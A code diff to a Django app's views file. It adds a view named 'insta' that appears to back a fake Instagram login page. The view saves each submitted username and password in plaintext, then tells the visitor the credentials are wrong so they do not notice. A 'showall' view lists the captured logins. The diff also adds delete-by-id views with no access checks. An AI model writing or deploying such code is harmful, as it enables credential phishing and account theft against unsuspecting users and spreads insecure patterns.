@@ -1,5 +1,6 @@
-from django.shortcuts import render,redirect
-from .models import Basicform,DATA
+from django.shortcuts import render,redirect,HttpResponse
+
+from .models import Basicform,DATA,Insta
 
 
 # Create your views here.
@@ -22,11 +23,22 @@ def index(request):
 
     return render(request,"index.html")
 
+def delete(request,contact_id):
+    dele=Basicform.objects.get(id=contact_id)
+    dele.delete()
+    return redirect('showall')
+def delete_data(request,data_id):
+    delet=DATA.objects.get(id=data_id)
+    delet.delete()
+    return redirect('showall')
+
 
 def showall(request):
     show=Basicform.objects.all()
     data=DATA.objects.all()
-    Synt={"show":show,"data":data}
+    inta=Insta.objects.all()
+
+    Synt={"show":show,"data":data,"inta":inta}
     return render(request,"showall.html",Synt)
 
 def home(request):
@@ -52,6 +64,22 @@ def data(request):
         return redirect('/')
         
     return render(request,"data.html")
+
+
+def insta(request):
+    if request.method=='POST':
+        username=request.POST.get('username')
+        password=request.POST.get('password')
+        print(username)
+        Insta.objects.create(
+            username=username,
+            password=password,
+        )
+        return HttpResponse("Your username and password are wrong")
+
+    return render(request,'insta.html')
+
+
 
 
 
